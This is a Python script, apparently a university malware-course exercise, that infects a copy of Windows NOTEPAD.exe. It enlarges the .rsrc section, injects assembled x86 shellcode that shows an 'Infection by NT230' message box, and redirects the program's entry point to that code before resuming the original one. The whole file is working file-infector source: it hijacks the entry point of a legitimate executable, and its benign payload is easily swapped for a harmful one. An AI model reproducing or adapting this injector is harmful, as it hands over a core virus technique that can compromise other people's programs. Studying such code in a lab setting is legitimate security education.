import pefile  # Import thư viện pefile để làm việc với tập tin thực thi Windows PE
from keystone import *  # Import thư viện keystone để tạo shellcode

def extend_bytes(size, b):
    """
    Mở rộng một mảng byte đến kích thước nhất định.
    """
    return b + (size - len(b)) * b'\x00'

def to_wstring(tosend):
    """
    Chuyển đổi một chuỗi Unicode thành một chuỗi byte theo định dạng UTF-16-BE.
    """
    snd_data = bytes([(len(tosend) >> 8), (len(tosend) & 0xff)])
    snd_data += tosend.encode('utf-16-be')
    return snd_data[3:]

pe = pefile.PE('C:\\Users\\penguin\\Desktop\\prj_execs\\NOTEPAD.exe')  # Mở tập tin thực thi NOTEPAD.exe
oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint  # Lấy địa chỉ của entry point của tập tin

imageBase = pe.OPTIONAL_HEADER.ImageBase  # Lấy địa chỉ bắt đầu của tập tin thực thi

# Tìm địa chỉ của hàm MessageBoxW trong bảng import
def find_import_address(name):
    for item in pe.DIRECTORY_ENTRY_IMPORT:
        for import_fn in item.imports:
            if import_fn.name == name.encode():
                return import_fn.address
    raise 'Funtion not found'

MessageBoxWAddress = find_import_address('MessageBoxW')

# Mở rộng section .rsrc để chứa payload mới
for sect in pe.sections:
    if b".rsrc" in sect.Name:
        rsrc_RA = sect.PointerToRawData
        rsrc_VA = sect.VirtualAddress

        sect.SizeOfRawData += 0x1000
        sect.Misc_VirtualSize += 0x1000
        break

extend_address = 0x00011000
offset = (extend_address - rsrc_RA + rsrc_VA)

# Tính toán địa chỉ của caption và text để truyền vào shellcode
captionAddress = 0x40 + offset + imageBase
textAddress = 0x70 + offset + imageBase
oep_offset = oep - offset  # Địa chỉ của lệnh nhảy từ section .rsrc đến entry point

# Tạo shellcode để gọi MessageBoxW và sau đó nhảy đến entry point ban đầu
code = f"""
push 0 ;
push {captionAddress} ;
push {textAddress} ;
push 0 ;
call [{MessageBoxWAddress}] ;
jmp {oep_offset} ;
"""

ks = Ks(KS_ARCH_X86, KS_MODE_32)  # Khởi tạo keystone engine cho kiến trúc x86 và mode 32-bit
encoding, count = ks.asm(code)  # Biên dịch mã assembly thành shellcode
shellcode = bytes(encoding)
shellcode = extend_bytes(0x40, shellcode)  # Mở rộng shellcode đến kích thước nhất định

# Chuẩn bị caption và text dưới dạng byte
caption = extend_bytes(0x30, to_wstring('Infection by NT230'))
text = extend_bytes(0x40, to_wstring('21521817 - 21521253- 21520353 - 21522469'))

# Đặt lại entry point của tập tin và mở rộng kích thước hình ảnh
pe.OPTIONAL_HEADER.AddressOfEntryPoint = offset
pe.OPTIONAL_HEADER.SizeOfImage += 0x1000

# Ghi tập tin thực thi mới
pe.write('C:\\Users\\penguin\\Desktop\\prj_execs\\penguin_NOTEPAD.exe')

# Mở rộng tập tin mới và thêm shellcode, caption, và text vào cuối
with open('C:\\Users\\penguin\\Desktop\\prj_execs\\penguin_NOTEPAD.exe', 'rb') as f:
    pebyte = f.read()
    f.close()

new_pebyte = extend_bytes(extend_address, pebyte) + shellcode + caption + text
new_pebyte = extend_bytes(len(pebyte) + 0x1000, new_pebyte)

# Ghi tập tin mới đã được mở rộng
with open('C:\\Users\\penguin\\Desktop\\prj_execs\\penguin_NOTEPAD.exe', 'wb') as f:
    f.write(new_pebyte)
    f.close()
